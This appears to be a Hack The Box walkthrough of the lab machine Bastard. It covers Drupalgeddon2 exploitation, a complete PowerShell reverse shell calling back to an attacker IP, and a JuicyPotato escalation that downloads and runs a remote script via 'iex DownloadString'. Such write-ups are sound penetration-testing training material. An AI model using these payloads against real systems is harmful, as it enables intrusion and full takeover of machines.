# Box 



![](img/Pasted%20image%2020210820061623.png)

https://app.hackthebox.eu/machines/Bastard

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User & Root](#user--root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.9 10.10.10.9
```

![](img/Pasted%20image%2020210820065454.png)


From my previous experience I know that Drupal 7 is vulnerable to RCE, you can get the  exploit here.  (https://github.com/dreadlocked/Drupalgeddon2)
## Exploitation 

Let's run it.


![](img/Pasted%20image%2020210820065606.png)


Now we have command execution : 

![](img/Pasted%20image%2020210820065636.png)


## Post-Exploitation
### User & Root
However is it not a reverse shell so let's trigger it.

I used this payload for my reverse shell :
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Now let's convert it to base64.

```sh
echo "<payload>" | iconv -t utf-16le | base64 -w 0
```

![](img/Pasted%20image%2020210820070034.png)

![](img/Pasted%20image%2020210820070046.png)

Let's setup a smbserver to transfer files easily.
```
smbserver.py share . -smb2support
```

```
net use x: \\10.10.14.13\share
```

Let's check for our privileges : 

![](img/Pasted%20image%2020210820074232.png)

Since we have the `SeImpersonatePrivilege` Enabled we can use JuicyPotato to get a root shell.

But first we need to know what is the current os to get a valid CLSID.

Running `systeminfo`

![](img/Pasted%20image%2020210820074408.png)

On this page you can find CLSID for different versions of windows : 
https://ohpe.it/juicy-potato/CLSID/

Let's use `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`

For this exploit let's create a file `rev.ps1` with our previous reverse shell and download it thanks to `JuicyPotato`.

Let's run it ! 

```
.\JuicyPotato -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.13:4444/rev.ps1')" -t *
```

![](img/Pasted%20image%2020210820074704.png)

![](img/Pasted%20image%2020210820074642.png)

Rooted.
